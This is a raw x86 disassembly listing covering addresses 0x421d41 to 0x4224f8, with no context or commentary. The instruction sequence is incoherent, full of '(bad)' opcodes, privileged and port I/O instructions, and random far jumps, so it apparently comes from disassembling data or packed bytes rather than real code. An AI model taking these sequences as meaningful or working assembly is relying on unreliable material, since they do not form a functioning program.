  421d41:	adc    ebp,DWORD PTR [edx+ebp*4-0x76]
  421d45:	fcomp  DWORD PTR [ebx+0x59efc4c1]
  421d4b:	pop    edi
  421d4c:	jmp    0x421cf2
  421d4e:	outs   dx,DWORD PTR es:[esi]
  421d50:	pop    ebx
  421d51:	push   esp
  421d52:	repnz inc edx
  421d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d55:	jo     0x421db8
  421d57:	push   eax
  421d58:	scas   al,BYTE PTR es:[edi]
  421d59:	xchg   ecx,eax
  421d5a:	xchg   esi,eax
  421d5b:	pop    ecx
  421d5c:	cmp    edx,DWORD PTR [eax+edi*1]
  421d5f:	or     DWORD PTR cs:[ecx+0x2b003911],esi
  421d66:	pop    esi
  421d67:	(bad)  
  421d68:	cmc    
  421d69:	pop    edi
  421d6a:	es jl  0x421d60
  421d6d:	inc    edi
  421d6e:	aam    0xa5
  421d70:	pop    esp
  421d71:	dec    edx
  421d72:	rol    edx,cl
  421d74:	and    edx,DWORD PTR [esi+0x2]
  421d77:	cld    
  421d78:	cmp    DWORD PTR [edx+0x19],esi
  421d7b:	mov    ecx,0xb53bd422
  421d80:	xor    BYTE PTR [ebp+0xf],dh
  421d83:	dec    ebx
  421d84:	data16 ja 0x421d5e
  421d87:	dec    edx
  421d88:	jne    0x421e01
  421d8a:	cmc    
  421d8b:	lods   eax,DWORD PTR ds:[esi]
  421d8c:	jge    0x421d85
  421d8e:	icebp  
  421d8f:	jns    0x421da5
  421d91:	dec    ebx
  421d92:	or     esp,DWORD PTR [ebx]
  421d94:	clc    
  421d95:	sub    bl,BYTE PTR [esi-0x68bfbc9d]
  421d9b:	sub    eax,0x972a65f9
  421da0:	popa   
  421da1:	pop    ss
  421da2:	pop    esp
  421da3:	inc    eax
  421da4:	xchg   esp,eax
  421da5:	lock sbb edx,DWORD PTR [esp+ebp*4+0x2a244cc2]
  421dad:	shr    DWORD PTR [eax],0xf2
  421db0:	cmp    eax,0xedc011ac
  421db5:	jge    0x421de5
  421db7:	cwde   
  421db8:	repnz mov edx,0x4eb23b13
  421dbe:	dec    ebp
  421dbf:	daa    
  421dc0:	shl    BYTE PTR [edi+eax*1+0x7c77cb75],1
  421dc7:	and    BYTE PTR [ecx+0x79b89674],bh
  421dcd:	std    
  421dce:	je     0x421de9
  421dd0:	pop    ds
  421dd1:	cld    
  421dd2:	cdq    
  421dd3:	dec    ecx
  421dd4:	jnp    0x421e13
  421dd6:	jne    0x421ddb
  421dd8:	mov    dl,0x6d
  421dda:	xchg   edi,eax
  421ddb:	xchg   ecx,esi
  421ddd:	inc    ebp
  421dde:	pop    ds
  421ddf:	pop    eax
  421de0:	icebp  
  421de1:	and    BYTE PTR [ecx+0x14],0x57
  421de5:	push   esi
  421de6:	outs   dx,BYTE PTR ds:[esi]
  421de7:	popa   
  421de8:	dec    ecx
  421de9:	icebp  
  421dea:	mov    fs,WORD PTR [ecx]
  421dec:	sbb    eax,0xf7f1efce
  421df1:	cld    
  421df2:	into   
  421df3:	div    DWORD PTR [ebp+0x30]
  421df6:	jp     0x421dd8
  421df8:	mov    ecx,0x5f8200c0
  421dfd:	adc    eax,0x32257eb4
  421e02:	mov    ?,WORD PTR [edi+0x2e]
  421e05:	das    
  421e06:	jecxz  0x421e5c
  421e08:	rcl    DWORD PTR [esi+0x78],0x1f
  421e0c:	adc    BYTE PTR [edi+0x717ffb58],dh
  421e12:	(bad)  
  421e13:	icebp  
  421e14:	test   BYTE PTR [ebp-0x6],ah
  421e17:	mov    ds:0x58c4c0bf,eax
  421e1c:	ins    DWORD PTR es:[edi],dx
  421e1d:	mov    ebx,0xa58fce84
  421e22:	and    ebp,DWORD PTR [eax+0x78343172]
  421e28:	rcl    BYTE PTR [edi+0x728724cd],cl
  421e2e:	hlt    
  421e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e31:	outs   dx,DWORD PTR ds:[esi]
  421e32:	test   eax,0x21aa4301
  421e37:	xchg   esp,eax
  421e38:	loop   0x421e19
  421e3a:	inc    esp
  421e3b:	faddp  st(0),st
  421e3d:	imul   edx,DWORD PTR [ecx+0xa67cac7],0x49
  421e44:	vandps xmm4,xmm3,XMMWORD PTR [ecx-0x6d3a72f4]
  421e4c:	add    al,0xd
  421e4e:	sub    bl,0xee
  421e51:	push   esp
  421e52:	pusha  
  421e53:	out    dx,eax
  421e54:	(bad)  
  421e55:	add    DWORD PTR [edi+0x49],0x20
  421e59:	(bad)  
  421e5a:	dec    edx
  421e5b:	mov    esp,DWORD PTR [edi]
  421e5d:	xor    al,0xec
  421e5f:	jmp    0x9ff02afc
  421e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e65:	and    bh,0xd
  421e68:	mov    ds:0x4444cf4d,eax
  421e6d:	cmp    ch,ah
  421e6f:	lock push edx
  421e71:	sub    ebx,DWORD PTR [eax]
  421e73:	mov    fs:0x5be2d18a,eax
  421e79:	add    al,0x1b
  421e7b:	dec    esi
  421e7c:	add    edx,DWORD PTR [ebx]
  421e7e:	push   ebx
  421e7f:	pop    ecx
  421e80:	(bad)  
  421e82:	lods   al,BYTE PTR ds:[esi]
  421e83:	int    0x52
  421e85:	ins    BYTE PTR es:[edi],dx
  421e86:	dec    edx
  421e87:	shl    BYTE PTR [eax],cl
  421e89:	mov    ch,0xcd
  421e8b:	stos   BYTE PTR es:[edi],al
  421e8c:	jmp    0x421e63
  421e8e:	hlt    
  421e8f:	repz xor BYTE PTR [ecx],al
  421e92:	sub    bl,ch
  421e94:	push   ebp
  421e95:	mov    WORD PTR [ecx+0x20e72cd1],fs
  421e9b:	aaa    
  421e9c:	xchg   edx,eax
  421e9d:	loopne 0x421e24
  421e9f:	cli    
  421ea0:	aaa    
  421ea1:	fucomi st,st(5)
  421ea3:	call   0x5843a64f
  421ea8:	in     al,dx
  421ea9:	and    BYTE PTR [edi+0x25a2917c],dh
  421eaf:	mov    ah,0x87
  421eb1:	jo     0x421e52
  421eb3:	push   0xffffffc2
  421eb5:	adc    BYTE PTR [ebx+0x5d066c92],0x1d
  421ebc:	retf   
  421ebd:	or     BYTE PTR [edi+0x56],cl
  421ec0:	test   ebp,esi
  421ec2:	jecxz  0x421f3d
  421ec4:	xor    dl,bl
  421ec6:	dec    BYTE PTR [ecx+0xe]
  421ec9:	cwde   
  421eca:	cmp    DWORD PTR [esi-0x17],ebx
  421ecd:	(bad)  
  421ece:	test   al,0x36
  421ed0:	jp     0x421f11
  421ed2:	fidiv  WORD PTR [esi]
  421ed4:	stc    
  421ed5:	into   
  421ed6:	ins    DWORD PTR es:[edi],dx
  421ed7:	jbe    0x421f31
  421ed9:	(bad)  
  421eda:	addr16 dec edi
  421edc:	mov    dl,0xac
  421ede:	nop
  421edf:	scas   al,BYTE PTR es:[edi]
  421ee0:	int    0x24
  421ee2:	mov    ah,0xba
  421ee4:	mov    esi,0x791e653a
  421ee9:	sbb    dl,BYTE PTR [edx+0x36c980cb]
  421eef:	gs pop ebx
  421ef1:	gs jno 0x421f1c
  421ef4:	aas    
  421ef5:	lea    esi,[ecx+0x5dba1d59]
  421efb:	call   0x143a:0xc56af3f6
  421f02:	ins    DWORD PTR es:[edi],dx
  421f03:	mov    ebp,0x5d11a0d
  421f08:	push   0x664448d3
  421f0d:	imul   ebp,DWORD PTR [esi+0x5],0xffffffd8
  421f11:	jge    0x421f32
  421f13:	pop    esi
  421f14:	sub    eax,0xf49764e6
  421f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f1b:	jecxz  0x421f3f
  421f1d:	aaa    
  421f1e:	add    dl,dl
  421f20:	adc    cl,al
  421f22:	std    
  421f23:	dec    ebp
  421f24:	xlat   BYTE PTR ds:[ebx]
  421f25:	xchg   ecx,eax
  421f26:	fld    DWORD PTR [ecx]
  421f28:	test   al,0x89
  421f2a:	cmp    esi,0x84013065
  421f30:	loope  0x421f6e
  421f32:	mov    al,0x8f
  421f34:	push   ecx
  421f35:	jecxz  0x421f7c
  421f37:	and    ch,dl
  421f39:	jmp    FWORD PTR [esi+edx*2+0x10f68511]
  421f40:	push   esi
  421f41:	push   edx
  421f42:	retf   
  421f43:	adc    edx,DWORD PTR [ecx-0x4a]
  421f46:	sar    BYTE PTR [edx],0xad
  421f49:	rol    BYTE PTR [ebp-0xc],0xed
  421f4d:	in     eax,dx
  421f4e:	push   es
  421f4f:	fwait
  421f50:	or     eax,0x9c2d2a79
  421f55:	imul   ecx,DWORD PTR [edx],0xffffffc2
  421f58:	ins    BYTE PTR es:[edi],dx
  421f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f5a:	sbb    DWORD PTR [edx-0x58],eax
  421f5d:	jl     0x421f6b
  421f5f:	dec    esp
  421f60:	out    0x76,al
  421f62:	xor    BYTE PTR [ecx+ebp*8-0x6b7072db],0xcb
  421f6a:	sbb    ch,0xaa
  421f6d:	mov    ebp,0xedd5a9c8
  421f72:	mov    ds:0x2a049cd3,al
  421f77:	and    DWORD PTR [ebp+0x11],ecx
  421f7a:	xchg   edx,eax
  421f7b:	rol    bh,cl
  421f7d:	jnp    0x421f1d
  421f7f:	in     eax,dx
  421f80:	or     eax,0xfdba555e
  421f85:	mov    WORD PTR [esi-0x38055e33],?
  421f8b:	mov    BYTE PTR [ebx+0x31d12266],ah
  421f91:	mov    ebx,0x41da536e
  421f96:	retf   
  421f97:	push   0xffffffb6
  421f99:	mov    cl,0x32
  421f9b:	sbb    al,0xc9
  421f9d:	rcr    BYTE PTR [edi+eiz*1],0x6d
  421fa1:	pop    edi
  421fa2:	cs repnz mov al,0xf0
  421fa6:	idiv   BYTE PTR [edi+0x6]
  421fa9:	fstp   DWORD PTR [edx+0x57]
  421fac:	mov    ebp,DWORD PTR [ebx-0x24]
  421faf:	mov    eax,ds:0x956d960f
  421fb4:	lahf   
  421fb5:	mov    eax,ds:0xb56d7a52
  421fba:	cli    
  421fbb:	scas   eax,DWORD PTR es:[edi]
  421fbc:	fstp   st(5)
  421fbe:	rcr    BYTE PTR [edi],0x1a
  421fc1:	sar    DWORD PTR [ebx-0x7d12ceb2],cl
  421fc7:	xchg   edx,eax
  421fc8:	jl     0x421f56
  421fca:	call   0xab93399b
  421fcf:	leave  
  421fd0:	xchg   ecx,eax
  421fd1:	mov    WORD PTR [ecx+0x272ba34c],ss
  421fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fd8:	ror    ebp,1
  421fda:	(bad)  
  421fdb:	push   ebp
  421fdc:	xchg   esp,eax
  421fdd:	mov    cl,dh
  421fdf:	pop    esp
  421fe0:	out    dx,al
  421fe1:	mov    dh,0x76
  421fe3:	pop    es
  421fe4:	imul   ebp,esi,0x6d
  421fe7:	jbe    0x421f97
  421fe9:	je     0x421fab
  421feb:	xchg   ebx,eax
  421fec:	stos   BYTE PTR es:[edi],al
  421fed:	hlt    
  421fee:	outs   dx,BYTE PTR es:[esi]
  421ff0:	xor    eax,0xdaf571a0
  421ff5:	lods   eax,DWORD PTR ds:[esi]
  421ff6:	mov    al,BYTE PTR [eax+0xd]
  421ff9:	pop    edi
  421ffa:	mov    edx,0x4f12ec9c
  421fff:	dec    edi
  422000:	mov    esp,0xfa24482c
  422005:	mov    al,ds:0x150940e4
  42200a:	inc    eax
  42200b:	in     eax,0x72
  42200d:	and    al,0x7a
  42200f:	dec    esi
  422010:	mov    eax,0x468772b4
  422015:	sub    eax,esp
  422017:	nop
  422018:	mov    ebx,0x781cb86d
  42201d:	test   DWORD PTR [eax+0x7b],eax
  422020:	adc    BYTE PTR [ebx+0xb],bh
  422023:	jmp    0x422099
  422025:	pop    edx
  422026:	jns    0x42203c
  422028:	aam    0x16
  42202a:	inc    edi
  42202b:	shl    ebx,0xb1
  42202e:	pop    edx
  42202f:	mov    dl,0xe8
  422031:	fwait
  422032:	(bad)  
  422034:	mov    ebx,0x9d372b80
  422039:	shl    DWORD PTR [ecx+0x7235e984],cl
  42203f:	into   
  422040:	mov    ds:0xb523e2eb,eax
  422045:	jl     0x421fda
  422047:	(bad)  
  422048:	jo     0x421fd9
  42204a:	mov    dl,0x47
  42204c:	test   BYTE PTR [ebp-0x1ccbb86d],ch
  422052:	cmp    DWORD PTR [ebp+0x1f],edi
  422055:	jo     0x4220a8
  422057:	pop    ebp
  422058:	pop    edx
  422059:	dec    esi
  42205a:	mov    bl,0xaa
  42205c:	lss    ebx,FWORD PTR [edx]
  42205f:	lea    ecx,[edx]
  422061:	jnp    0x4220d6
  422063:	sub    DWORD PTR [bp+si],ebp
  422066:	cs mov bl,0x82
  422069:	mov    ch,0x77
  42206b:	repnz pop edx
  42206d:	cmp    esi,esp
  42206f:	aad    0x26
  422071:	ja     0x4220c1
  422073:	or     dh,BYTE PTR [esi]
  422075:	inc    ebp
  422076:	fst    st(4)
  422078:	jg     0x422053
  42207a:	(bad)  
  42207b:	dec    esi
  42207c:	and    eax,DWORD PTR [ebx]
  42207e:	aad    0xe8
  422080:	pop    ebp
  422081:	loopne 0x4220ca
  422083:	xchg   ecx,eax
  422084:	ret    
  422085:	and    al,0x24
  422087:	pusha  
  422088:	test   al,0x29
  42208a:	dec    edx
  42208b:	test   eax,0x2b1dee7d
  422090:	pop    ebp
  422091:	mov    ebx,0x75f7fcb0
  422096:	push   ax
  422098:	(bad)  [ebp-0x4ca62dd3]
  42209e:	ins    DWORD PTR es:[edi],dx
  42209f:	popf   
  4220a0:	mov    esp,0x6329c13d
  4220a5:	pusha  
  4220a6:	mov    ebx,0xb84881f
  4220ab:	hlt    
  4220ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ad:	pop    ss
  4220ae:	sbb    DWORD PTR [edi+eiz*8-0x20],ebx
  4220b2:	fcomp  DWORD PTR [esi-0x70]
  4220b5:	sub    cl,BYTE PTR [edx+0x7b]
  4220b8:	and    ch,BYTE PTR [ebx+0x7a68d600]
  4220be:	cmp    eax,0xd1b028ae
  4220c3:	jmp    0x3ff5:0xb3d33a47
  4220ca:	outs   dx,BYTE PTR ds:[esi]
  4220cb:	daa    
  4220cc:	inc    ecx
  4220ce:	call   0x60e2:0x302def9f
  4220d5:	mov    ch,0x9
  4220d7:	(bad)  
  4220d8:	outs   dx,BYTE PTR ds:[esi]
  4220d9:	add    BYTE PTR [esi+ebx*4+0x77b22729],ah
  4220e0:	ins    BYTE PTR es:[edi],dx
  4220e1:	fwait
  4220e2:	adc    eax,0x10ceee5b
  4220e7:	inc    edx
  4220e8:	adc    edi,DWORD PTR [ecx+0x11]
  4220eb:	sahf   
  4220ec:	mov    dl,0xbc
  4220ee:	jnp    0x42212c
  4220f0:	pop    esp
  4220f1:	dec    ecx
  4220f2:	push   es
  4220f3:	pop    esi
  4220f4:	and    DWORD PTR [esi-0x8],ebp
  4220f7:	mov    edi,0x42a585bf
  4220fc:	sbb    ecx,DWORD PTR [edx+0x3eddaf5d]
  422102:	fist   DWORD PTR [esi+0x47]
  422105:	lods   al,BYTE PTR ds:[esi]
  422106:	mov    esi,0x1b83b949
  42210b:	addr16 js 0x42218a
  42210e:	add    BYTE PTR [ecx],ah
  422110:	jmp    0x42215d
  422112:	sbb    BYTE PTR [ecx],al
  422114:	div    BYTE PTR [ebp+0x61d7bf2d]
  42211a:	and    dl,BYTE PTR ds:0x37553529
  422120:	or     DWORD PTR [esi],ecx
  422122:	xchg   esp,eax
  422123:	not    DWORD PTR [edx+0x400293e2]
  422129:	mov    eax,ebp
  42212b:	and    edx,ecx
  42212d:	push   cs
  42212e:	jae    0x422157
  422130:	pop    ebx
  422131:	mov    ebp,0x259c229b
  422136:	outs   dx,DWORD PTR ds:[esi]
  422137:	sbb    DWORD PTR ds:0xdfc13a4c,ecx
  42213d:	call   0x3748:0xa08a4f68
  422144:	popa   
  422145:	add    edi,DWORD PTR [ebx+0x1f]
  422148:	mov    eax,0xead7c24c
  42214d:	sbb    eax,0x5e999b2c
  422152:	repnz cs ins BYTE PTR es:[edi],dx
  422155:	jo     0x4221af
  422157:	add    eax,0x52671fe2
  42215c:	xor    al,0xd7
  42215e:	(bad)  
  42215f:	push   ebp
  422160:	pop    es
  422161:	cvtdq2ps xmm5,XMMWORD PTR [eax-0x2c]
  422165:	mov    ecx,0x49441236
  42216a:	ds in  eax,0x23
  42216d:	imul   ebp,DWORD PTR [ecx+0x297d86a7],0x76ba97a7
  422177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422178:	cmp    DWORD PTR [edx+0x748fec67],edi
  42217e:	sar    DWORD PTR [eax-0x7436393c],0x78
  422185:	pop    esp
  422186:	add    ebp,eax
  422188:	hlt    
  422189:	or     al,0x99
  42218b:	jno    0x422197
  42218d:	xor    eax,0x71d129f1
  422192:	fs inc ecx
  422194:	cli    
  422195:	ja     0x4221f5
  422197:	bound  esp,QWORD PTR [ebx]
  422199:	sub    DWORD PTR [edi+0x2a],ebx
  42219c:	sti    
  42219d:	leave  
  42219e:	push   es
  42219f:	pop    edx
  4221a0:	bound  edx,QWORD PTR [ebx+0x64]
  4221a3:	xor    eax,DWORD PTR [esi+0x6b]
  4221a6:	and    DWORD PTR [ebp+esi*1-0x7],0xd437671e
  4221ae:	adc    DWORD PTR ds:0x99b09962,ebp
  4221b4:	rol    DWORD PTR [edi-0x16],1
  4221b7:	sbb    DWORD PTR [ecx],edx
  4221b9:	imul   eax,DWORD PTR [ecx-0x6a],0x81b4f87c
  4221c0:	aaa    
  4221c1:	inc    esi
  4221c2:	clc    
  4221c3:	jns    0x42217a
  4221c5:	scas   eax,DWORD PTR es:[edi]
  4221c6:	xchg   ecx,eax
  4221c7:	pop    eax
  4221c8:	xchg   ebx,eax
  4221c9:	push   edx
  4221ca:	outs   dx,DWORD PTR ds:[esi]
  4221cb:	inc    esp
  4221cc:	loop   0x422184
  4221ce:	call   0xe809967b
  4221d3:	rol    DWORD PTR [edx+0x75af49ab],cl
  4221d9:	jb     0x4221fd
  4221db:	imul   edi,DWORD PTR [eax],0x42
  4221de:	push   edi
  4221df:	int3   
  4221e0:	jmp    0xcb7b:0xd867ef91
  4221e7:	fsub   st(2),st
  4221e9:	mov    WORD PTR gs:0xb4067480,fs
  4221f0:	(bad)  
  4221f1:	adc    al,0x7a
  4221f3:	or     cl,BYTE PTR [edi]
  4221f5:	mul    DWORD PTR [eax]
  4221f7:	mov    BYTE PTR [esi+eiz*1-0x112918eb],al
  4221fe:	inc    edi
  4221ff:	push   0x92186be4
  422204:	addr16 jge 0x4221c8
  422207:	cmp    eax,0x27006ada
  42220c:	jne    0x4221f8
  42220e:	dec    ecx
  42220f:	shl    DWORD PTR [ecx+0x21ace3b0],cl
  422215:	fbstp  TBYTE PTR [eax*2-0x2e974174]
  42221c:	call   DWORD PTR [ecx-0x45]
  42221f:	retf   
  422220:	xchg   edi,eax
  422221:	(bad)  
  422222:	jo     0x42229c
  422224:	mov    esp,0x1a93e744
  422229:	retf   
  42222a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42222b:	cmp    esp,DWORD PTR [ecx+0x2f008167]
  422231:	sub    dl,BYTE PTR ds:0xf34fc1d8
  422237:	ins    DWORD PTR es:[edi],dx
  422238:	mov    bh,cl
  42223a:	mov    ds:0x417578cf,al
  42223f:	arpl   WORD PTR [ebx-0x3d],sp
  422242:	xchg   BYTE PTR [edi+0x20dc4adb],bh
  422248:	push   0x995e1dc0
  42224d:	outs   dx,DWORD PTR ds:[esi]
  42224e:	add    cl,ah
  422250:	pop    ebp
  422251:	push   ebp
  422252:	out    0x8a,eax
  422254:	out    0xa5,al
  422256:	xor    DWORD PTR [edi+ebx*8],ebx
  422259:	push   esp
  42225a:	scas   al,BYTE PTR es:[edi]
  42225b:	lods   eax,DWORD PTR ds:[esi]
  42225c:	mov    ch,0xd3
  42225e:	inc    esi
  42225f:	xchg   esp,eax
  422260:	sahf   
  422261:	cmp    al,0x3
  422263:	leave  
  422264:	fmul   DWORD PTR [ebx+0x6d]
  422267:	aaa    
  422268:	arpl   WORD PTR [ebx+0x1a],si
  42226b:	sbb    eax,0x77d81a87
  422270:	mov    edi,0x261cc334
  422275:	pop    es
  422276:	dec    eax
  422277:	rol    DWORD PTR [esi],1
  422279:	push   esi
  42227a:	mov    cl,0xf0
  42227c:	add    eax,esi
  42227e:	and    al,0x8
  422280:	cli    
  422281:	xor    BYTE PTR [ebx-0x10],ah
  422284:	ss je  0x422235
  422287:	outs   dx,BYTE PTR ds:[esi]
  422288:	fnstenv [eax-0x5f]
  42228b:	das    
  42228c:	or     cl,bh
  42228e:	sbb    BYTE PTR [eax-0x1a20bb08],cl
  422294:	dec    esi
  422295:	call   0xee2f0d66
  42229a:	adc    eax,0x6aafcbdd
  42229f:	push   es
  4222a0:	xchg   ecx,eax
  4222a1:	shr    BYTE PTR [ecx+0x27212f99],cl
  4222a7:	pop    ecx
  4222a8:	sub    bh,BYTE PTR [ebx+0x1]
  4222ab:	retf   
  4222ac:	mov    ch,0xb
  4222ae:	sbb    eax,0xb267b90c
  4222b3:	push   cs
  4222b4:	pop    ss
  4222b5:	push   ebp
  4222b6:	pop    edi
  4222b7:	ret    
  4222b8:	or     bh,bh
  4222ba:	xchg   DWORD PTR [eax-0x297d9682],ebx
  4222c0:	cmp    cl,bl
  4222c2:	push   0x8ee1a960
  4222c7:	jns    0x4222ee
  4222c9:	pop    es
  4222ca:	mov    dh,0x1f
  4222cc:	mov    al,ds:0x32f78230
  4222d1:	jle    0x4222e5
  4222d3:	fstp   st(0)
  4222d5:	inc    esp
  4222d6:	mov    es,WORD PTR [edi-0x59]
  4222d9:	out    dx,eax
  4222da:	imul   edi,esp,0x2e
  4222dd:	jle    0x42226f
  4222df:	repz sbb al,BYTE PTR [eax+0x45224e8]
  4222e6:	jl     0x42226c
  4222e8:	xor    al,0xf1
  4222ea:	adc    DWORD PTR [bx],0xdc9aaeab
  4222f1:	mov    ah,0xdb
  4222f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222f4:	mov    ebx,0xf84bc851
  4222f9:	fs es inc ebp
  4222fc:	and    eax,0x2a4c15a1
  422301:	mov    bl,0x98
  422303:	int    0xa5
  422305:	pop    ebp
  422306:	loope  0x422294
  422308:	lock push ss
  42230a:	or     edx,DWORD PTR [esi]
  42230c:	add    al,0x32
  42230e:	mov    cs,WORD PTR [eax]
  422310:	push   edi
  422311:	cmp    edi,DWORD PTR [esi]
  422313:	sbb    BYTE PTR [eax-0x72],ch
  422316:	xor    BYTE PTR [ebx],bh
  422318:	mov    ebp,0xd01eae3
  42231d:	dec    esi
  42231e:	inc    ebx
  42231f:	jle    0x4222a6
  422321:	adc    bl,cl
  422323:	mov    bh,0x1c
  422325:	jae    0x422307
  422327:	dec    esi
  422328:	jno    0x42238b
  42232a:	fstp   st(0)
  42232c:	icebp  
  42232d:	hlt    
  42232e:	sub    cl,al
  422330:	mov    ecx,0xa9ad08b6
  422335:	retf   0xefb4
  422338:	popf   
  422339:	and    eax,0x93be708
  42233e:	mov    bh,0x87
  422340:	arpl   WORD PTR [ebx],di
  422342:	aam    0x62
  422344:	xchg   esp,eax
  422345:	push   edx
  422346:	pop    ecx
  422347:	retf   
  422348:	ret    0x5bc8
  42234b:	mov    eax,ds:0x6b3b4abb
  422350:	add    BYTE PTR [ebx+0xc1acc36],ah
  422356:	inc    esi
  422357:	fimul  DWORD PTR [ebp-0x11]
  42235a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42235b:	and    BYTE PTR [ecx],0x9b
  42235e:	or     al,0xe
  422360:	leave  
  422361:	popf   
  422362:	mov    ss,ecx
  422364:	push   eax
  422365:	adc    eax,DWORD PTR [esi]
  422367:	arpl   WORD PTR [eax],si
  422369:	and    esi,DWORD PTR [ecx-0x6198d555]
  42236f:	add    DWORD PTR [eax],edi
  422371:	rol    BYTE PTR ds:0x654ec0c,cl
  422377:	and    esi,edi
  422379:	mul    dl
  42237b:	popa   
  42237c:	inc    edx
  42237d:	mov    edi,DWORD PTR ds:0x104b4a27
  422383:	pop    esp
  422384:	mov    BYTE PTR [ebp+0x2c],bl
  422387:	imul   edi,DWORD PTR ds:0xfdc46b40,0xa15fd62
  422391:	and    DWORD PTR ds:0x657f5d05,edi
  422397:	das    
  422398:	sub    eax,0x7a786c48
  42239d:	inc    esp
  42239e:	pop    esi
  42239f:	pop    ecx
  4223a0:	sbb    al,0x6f
  4223a2:	shl    BYTE PTR ds:0x4fa8a134,cl
  4223a8:	inc    edx
  4223a9:	pop    eax
  4223aa:	popa   
  4223ab:	out    0xef,eax
  4223ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223ae:	test   al,0xbe
  4223b0:	fisub  WORD PTR [edx+0x75]
  4223b3:	add    dh,BYTE PTR [edx]
  4223b5:	fwait
  4223b6:	js     0x42234d
  4223b8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4223ba:	lahf   
  4223bb:	jno    0x4223c1
  4223bd:	sahf   
  4223be:	dec    ebx
  4223bf:	(bad)  
  4223c0:	loop   0x4223d2
  4223c2:	shl    DWORD PTR gs:[ecx],cl
  4223c5:	mov    ch,0xcd
  4223c7:	mov    eax,0x1f000669
  4223cc:	xbegin 0xecc7446b
  4223d2:	popa   
  4223d3:	fs xchg esi,eax
  4223d5:	loope  0x4223c6
  4223d7:	or     esi,ecx
  4223d9:	mov    esi,0x63b9ee6b
  4223de:	sub    dh,BYTE PTR [eax+0x59354396]
  4223e4:	add    ecx,DWORD PTR [edx]
  4223e6:	(bad)  
  4223e7:	shl    ecx,1
  4223e9:	mov    DWORD PTR [ebx+0x7e],ebp
  4223ec:	rcr    ebp,1
  4223ee:	cmp    al,0x1e
  4223f0:	addr16 repnz and al,0x7e
  4223f4:	xchg   esp,eax
  4223f5:	dec    ebp
  4223f6:	enter  0x1472,0x9e
  4223fa:	(bad)  
  4223fb:	hlt    
  4223fc:	pop    esi
  4223fd:	sbb    BYTE PTR [ebx+edi*2],0x5
  422401:	iret   
  422402:	cld    
  422403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422404:	mov    bl,0x71
  422406:	stc    
  422407:	mov    dh,0xe4
  422409:	lods   al,BYTE PTR ds:[esi]
  42240a:	bound  edi,QWORD PTR [edx+0x44]
  42240d:	shl    al,0xe3
  422410:	and    BYTE PTR [ebp+0x4d8a9d7],ch
  422416:	rcl    BYTE PTR [esi+0x3dfc46b4],1
  42241c:	pop    ss
  42241d:	and    BYTE PTR [ebp-0x18],ch
  422420:	mov    bl,0x6c
  422422:	ja     0x422414
  422424:	cmc    
  422425:	cmp    cl,BYTE PTR [esi-0x3d]
  422428:	out    dx,al
  422429:	shufps xmm0,XMMWORD PTR [eax-0x33e5330d],0x64
  422431:	ins    BYTE PTR es:[edi],dx
  422432:	sub    BYTE PTR [ebp-0x306ffd08],bl
  422438:	push   ebp
  422439:	lea    esi,[eax+0x10ceec8c]
  42243f:	sar    ch,cl
  422441:	dec    ebx
  422442:	push   eax
  422443:	out    dx,al
  422444:	(bad)  
  422445:	cmp    edx,esp
  422447:	bound  eax,QWORD PTR [ebp-0x1f]
  42244a:	mov    eax,ds:0xc0928601
  42244f:	rcl    DWORD PTR [ebx+0x117462ef],cl
  422455:	stos   BYTE PTR es:[edi],al
  422456:	fwait
  422457:	mov    ecx,0xa1257cf8
  42245c:	call   0x1e5c5d53
  422461:	add    bl,BYTE PTR [esi]
  422463:	fs jno 0x4224cc
  422466:	mov    DWORD PTR [ecx+0x28],ebp
  422469:	call   0x5530:0x7d730a0f
  422470:	test   eax,0xfb41b9c2
  422475:	inc    ebp
  422476:	jo     0x4224ca
  422478:	xor    BYTE PTR [eax+0x270563a0],0xfa
  42247f:	and    BYTE PTR [ecx-0x7ee6a167],bl
  422485:	int    0xf0
  422487:	ror    BYTE PTR [esi+0x31aff9b0],cl
  42248d:	xchg   ecx,eax
  42248e:	(bad)  
  42248f:	sti    
  422490:	push   edi
  422491:	sbb    eax,0xf57ed192
  422496:	dec    eax
  422497:	loop   0x422497
  422499:	inc    edi
  42249a:	std    
  42249b:	in     al,0xec
  42249d:	(bad)  
  42249e:	bound  edi,QWORD PTR [ebp-0x26]
  4224a1:	test   DWORD PTR [esi-0x229140b1],edx
  4224a7:	dec    esp
  4224a8:	fisubr DWORD PTR [eax-0x40]
  4224ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224ac:	fwait
  4224ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224ae:	mov    DWORD PTR [ebx],ecx
  4224b0:	mov    ah,BYTE PTR [edi+0x66]
  4224b3:	and    DWORD PTR [eax+0x31],edi
  4224b6:	jns    0x422456
  4224b8:	fiadd  DWORD PTR [ebp-0x45a86495]
  4224be:	or     BYTE PTR [edx-0x14],bl
  4224c1:	and    bl,cl
  4224c3:	push   esi
  4224c4:	mov    ebp,0xd7203fd5
  4224c9:	out    0x87,eax
  4224cb:	mov    ah,0xd
  4224cd:	jp     0x4224d2
  4224cf:	mov    ?,WORD PTR [ebx+ebp*4-0x1fc2e8ad]
  4224d6:	jmp    0xf030:0xf2b4083b
  4224dd:	fs mov cl,0x8e
  4224e0:	xor    eax,edi
  4224e2:	jecxz  0x4224f5
  4224e4:	xchg   edx,eax
  4224e5:	leave  
  4224e6:	cmp    BYTE PTR [ebp+0x6ccb7566],bl
  4224ec:	mov    ds:0xfb321706,eax
  4224f1:	inc    esi
  4224f2:	aad    0xc5
  4224f4:	outs   dx,BYTE PTR ds:[esi]
  4224f5:	jbe    0x4224b4
  4224f7:	xchg   edi,eax
  4224f8:	xor    al,0x7a
